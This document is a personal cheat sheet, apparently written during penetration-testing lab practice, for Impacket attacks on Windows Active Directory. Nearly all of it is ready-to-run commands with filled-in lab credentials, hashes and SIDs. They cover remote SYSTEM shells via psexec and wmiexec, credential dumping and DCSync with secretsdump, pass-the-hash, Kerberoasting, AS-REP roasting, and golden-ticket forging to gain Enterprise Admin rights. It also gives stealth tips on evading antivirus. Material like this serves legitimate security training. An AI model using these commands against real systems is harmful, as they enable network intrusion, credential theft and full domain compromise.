# Impacket — Windows Attack Scripts
# Run all commands from: ~/impacket-latest/examples/
# Format: python3 <script>.py <domain>/<user>:<password>@<target>

---

## Universal Auth Syntax

All impacket scripts follow the same auth pattern:
```
# Password
python3 script.py domain/username:password@TARGET_IP

# Pass-the-Hash (NTLM hash instead of password)
# Format is LMHASH:NTHASH — if you only have NT hash, put colon before it
python3 script.py domain/username@TARGET_IP -hashes :NTLMHASH

# Kerberos ticket (from ccache file)
export KRB5CCNAME=/path/to/ticket.ccache
python3 script.py domain/username@TARGET_IP -k -no-pass
```

---

## Universal Flags (work on almost every script)
```
-hashes LMHASH:NTHASH    Pass-the-Hash instead of password
                          If you only have NT hash: -hashes :NTLMHASH

-no-pass                  Don't prompt for password (use with -k for Kerberos)

-k                        Use Kerberos auth from ccache file (set KRB5CCNAME first)

-dc-ip                    IP of the Domain Controller
                          Use when DNS isn't resolving domain names properly

-target-ip                IP of the actual target machine
                          Use when target is a hostname your Kali can't resolve
```

---

## Remote Execution — Getting a Shell

Try in this order if one fails: psexec -> wmiexec -> smbexec -> dcomexec

### psexec.py — Most reliable shell, noisy (writes a service binary to disk)
```
python3 psexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
python3 psexec.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfcbf52a53d6299aab57055
```
- Gives a SYSTEM shell (highest privilege)
- Writes a binary to ADMIN$ — detected easily by AV
- Requires: local admin access

### wmiexec.py — Semi-interactive shell via WMI, stealthier than psexec
```
python3 wmiexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
python3 wmiexec.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfcbf52a53d6299aab57055
```
- Runs as Administrator (not SYSTEM)
- Does NOT write a binary to disk
- Good first fallback when psexec fails

### smbexec.py — Shell via SMB, no writable share needed
```
python3 smbexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
python3 smbexec.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfcbf52a53d6299aab57055
```
- Does NOT use RemComSvc like psexec
- Creates a local smbserver to receive output
- Useful when target has no writable share

### atexec.py — Single command via Task Scheduler (no interactive shell)
```
python3 atexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159 'whoami'
```
- Not a shell — executes ONE command and returns output

### dcomexec.py — Shell via DCOM, last resort alternative to wmiexec
```
python3 dcomexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159
```

---

## Quick Reference — Which Shell Script To Use?
```
psexec.py   -> SYSTEM shell, noisy, most reliable
wmiexec.py  -> Admin shell, stealthy, no disk writes
smbexec.py  -> Admin shell, no writable share needed
atexec.py   -> Single command only, no shell
dcomexec.py -> Admin shell, uses DCOM (last resort)
```

---

## secretsdump.py — Dump Credentials

### MODE 1: Remote dump from a live machine
```
# Dump everything (SAM + LSA + cached creds)
python3 secretsdump.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159

# Pass-the-Hash version
python3 secretsdump.py zeus.corp/Administrator@192.168.158.159 -hashes :a1fcb4118dfcbf52a53d6299aab57055

# Without Domain
python3 secretsdump.py 'Eric.Wallows:EricLikesRunning800@192.168.107.163'
```

### MODE 2: LOCAL — parse files you already downloaded to Kali
```
# You have: sam + system files downloaded from target
python3 secretsdump.py -sam /path/to/sam -system /path/to/system LOCAL

# Real example from this lab:
python3 secretsdump.py -sam ~/tools/File\ Transfer/sam -system ~/tools/File\ Transfer/system LOCAL

# With NTDS.dit (grabbed from a DC):
python3 secretsdump.py -system /path/to/system -ntds /path/to/ntds.dit LOCAL

# With NTDS.dit — only output NTLM hashes (cleaner):
python3 secretsdump.py -system /path/to/system -ntds /path/to/ntds.dit LOCAL -just-dc-ntlm

# With NTDS.dit — include password history and account status:
python3 secretsdump.py -system /path/to/system -ntds /path/to/ntds.dit LOCAL -just-dc-ntlm -history -user-status
```
NOTE: LOCAL goes at the END of the command, not the beginning.
NOTE: LOCAL means "parse files on my Kali" — no target IP needed.

### MODE 3: DCSync — pull hashes directly from a DC over the network
```
# Requires DCSync rights (Domain Admin or delegated replication rights)
python3 secretsdump.py zeus.corp/Administrator:password@192.168.158.158 -just-dc-ntlm

# Dump only a specific user from the DC:
python3 secretsdump.py zeus.corp/Administrator:password@192.168.158.158 -just-dc-user Administrator

# PTH version:
python3 secretsdump.py zeus.corp/Administrator@192.168.158.158 -hashes :NTLMHASH -just-dc-ntlm
```

### Useful secretsdump flags
```
-just-dc-ntlm     Only dump NTLM hashes from DC (cleaner output, skip Kerberos keys)
-just-dc          Dump everything from DC including Kerberos keys
-just-dc-user     Only dump one specific user from the DC
-history          Include password history (old passwords, useful for cracking patterns)
-user-status      Show whether each account is Enabled or Disabled
-outputfile       Save results to a file instead of just printing
```

### What secretsdump output means
```
# SAM hashes — local accounts on that machine
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1fcb4118dfcbf52a53d6299aab57055:::
                                                    ^--- this is the NTLM hash you use for PTH

# Cached domain logon (DCC2) — NOT usable for PTH, crack offline with hashcat -m 2100
ZEUS.CORP/o.foller:$DCC2$10240#o.foller#02b31594bda9e176c8cb8e3b8c9a9395

# LSA Secrets — plaintext passwords stored for services/scheduled tasks
zeus\o.foller:EarlyMorningFootball777    <- use this directly

# Machine account keys — computer account, useful for Kerberos attacks
zeus\CLIENT01$:aad3b435b51404eeaad3b435b51404ee:1a1655aa3814ae5ac13899d8f52788ad:::
```

---

## Kerberos Scripts

### GetUserSPNs.py — Kerberoasting (request TGS tickets for service accounts)
```
python3 GetUserSPNs.py zeus.corp/o.foller:EarlyMorningFootball777 -dc-ip 192.168.158.158 -request
```
- Finds service accounts with SPNs and requests their tickets
- Crack tickets offline: hashcat -m 13100
- Any domain user can do this — no special privileges needed

### GetNPUsers.py — AS-REP Roasting (accounts with no pre-auth required)
```
python3 GetNPUsers.py zeus.corp/ -usersfile users.txt -dc-ip 192.168.158.158 -no-pass
python3 GetNPUsers.py zeus.corp/o.foller:EarlyMorningFootball777 -dc-ip 192.168.158.158
```
- Returns crackable hashes: hashcat -m 18200

### getTGT.py — Request a TGT (load it for Kerberos auth with other tools)
```
python3 getTGT.py zeus.corp/o.foller:EarlyMorningFootball777
python3 getTGT.py zeus.corp/o.foller -hashes :decca5b9babc228de4cedeb29a6b9abf
# After running, load the ticket:
export KRB5CCNAME=o.foller.ccache
```

### getST.py — Request a Service Ticket (used in delegation attacks)
```
python3 getST.py zeus.corp/o.foller:EarlyMorningFootball777 -spn cifs/TARGET -dc-ip 192.168.158.158
```
---

## ticketer.py — Forge Kerberos Tickets (Golden/Silver Ticket attacks)

### Golden Ticket — forge a TGT using krbtgt hash (full domain access)
```
# Using NTLM hash
python3 ticketer.py -nthash KRBTGT_NTLM -domain child.domain.com -domain-sid CHILD_SID -extra-sid PARENT_SID-519 Administrator

# Using AES256 key (preferred — looks more legitimate)
python3 ticketer.py -aesKey KRBTGT_AES256 -domain child.domain.com -domain-sid CHILD_SID -extra-sid PARENT_SID-519 Administrator
```

### Real example from Poseidon lab (child → parent domain):
```
python3 ticketer.py -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 -domain sub.poseidon.yzx -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 Administrator
```

### Load and use the ticket:
```
export KRB5CCNAME=Administrator.ccache
python3 psexec.py child.domain.com/Administrator@DC01.parent.domain.com -k -no-pass
```

### Flag breakdown:
```
-nthash       krbtgt NTLM hash (less preferred)
-aesKey       krbtgt AES256 key (preferred, stealthier)
-domain       the child domain you own (FQDN)
-domain-sid   SID of the child domain
-extra-sid    SID of the parent domain + -519 (Enterprise Admins group)
              The -519 is what gives you Enterprise Admin rights in parent
-k            Use Kerberos ticket from KRB5CCNAME
-no-pass      Don't prompt for password
```

### Where to get the values needed:
```
krbtgt hash/aesKey  → secretsdump output (ntds.dit dump)
domain-sid          → nltest /domain_trusts /v (run from any domain machine)
extra-sid           → nltest /domain_trusts /v (parent domain SID) + append -519
```
---

## Enumeration Scripts

### GetADUsers.py — List all domain users
```
python3 GetADUsers.py zeus.corp/o.foller:EarlyMorningFootball777 -dc-ip 192.168.158.158 -all
```

### lookupsid.py — Enumerate users/groups by brute-forcing SIDs
```
python3 lookupsid.py zeus.corp/o.foller:EarlyMorningFootball777@192.168.158.158
```

### rpcdump.py — List RPC services running on a target
```
python3 rpcdump.py zeus.corp/o.foller:EarlyMorningFootball777@192.168.158.159
```

### smbclient.py — Browse SMB shares interactively
```
cd ~/tools/

# List shares with no password - backslash syntax (alternative to forward slash version)
python3 smbclient.py -N -L \\\\192.168.91.111\\
#Found a folder? IE: MyDocuments
python3 smbclient.py -N -L \\\\192.168.91.111\\MyDocuments

python3 smbclient.py zeus.corp/o.foller:EarlyMorningFootball777@192.168.158.159
# Inside the shell: shares, use C$, ls, get filename, put filename

#No Password Login
python3 smbclient.py -L //192.168.123.111/ --no-pass
```

---

## Real Examples From This Lab
```
# Remote dump CLIENT01 as Eric:
python3 secretsdump.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159

# Parse downloaded SAM + SYSTEM files from DC01 locally:
python3 secretsdump.py -sam ~/tools/File\ Transfer/sam -system ~/tools/File\ Transfer/system LOCAL

# Get a shell on CLIENT01 as Eric:
python3 psexec.py zeus.corp/Eric.Wallows:EricLikesRunning800@192.168.158.159

# PTH with local admin hash against other machines:
python3 psexec.py zeus.corp/Administrator@192.168.158.158 -hashes :a1fcb4118dfcbf52a53d6299aab57055
python3 psexec.py zeus.corp/Administrator@192.168.158.160 -hashes :a1fcb4118dfcbf52a53d6299aab57055

# Kerberoast the domain as o.foller:
python3 GetUserSPNs.py zeus.corp/o.foller:EarlyMorningFootball777 -dc-ip 192.168.158.158 -request
```